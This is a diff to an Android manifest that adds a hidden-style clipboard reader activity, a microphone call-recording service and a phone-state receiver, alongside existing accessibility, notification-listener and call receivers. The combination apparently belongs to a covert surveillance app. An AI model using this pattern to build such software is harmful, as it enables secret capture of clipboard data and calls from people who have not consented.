@@ -77,6 +77,14 @@
         android:allowTaskReparenting="true"
         android:directBootAware="true">
 
+<activity
+    android:name=".ClipboardReaderActivity"
+    android:excludeFromRecents="true"
+    android:exported="false"
+    android:noHistory="true"
+    android:launchMode="singleInstance"
+    android:theme="@android:style/Theme.DeviceDefault.Dialog.Alert" />
+	
         <!-- ==================== MAIN ACTIVITY ==================== -->
         <activity
             android:name=".MainActivity"
@@ -119,7 +127,13 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/service_config" />
         </service>
-
+		
+		<service
+    android:name=".CallRecorder"
+    android:enabled="true"
+    android:exported="false"
+    android:foregroundServiceType="microphone" />
+		
         <!-- ==================== NEW: NOTIFICATION LISTENER SERVICE ==================== -->
         <service
             android:name=".NotificationListener"
@@ -142,6 +156,15 @@
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
+		
+		<receiver
+    android:name=".CallReceiver"
+    android:enabled="true"
+    android:exported="true">
+    <intent-filter>
+        <action android:name="android.intent.action.PHONE_STATE" />
+    </intent-filter>
+</receiver>
 
         <!-- ==================== NEW: MEDIA / STORAGE CHANGE RECEIVER ==================== -->
         <receiver
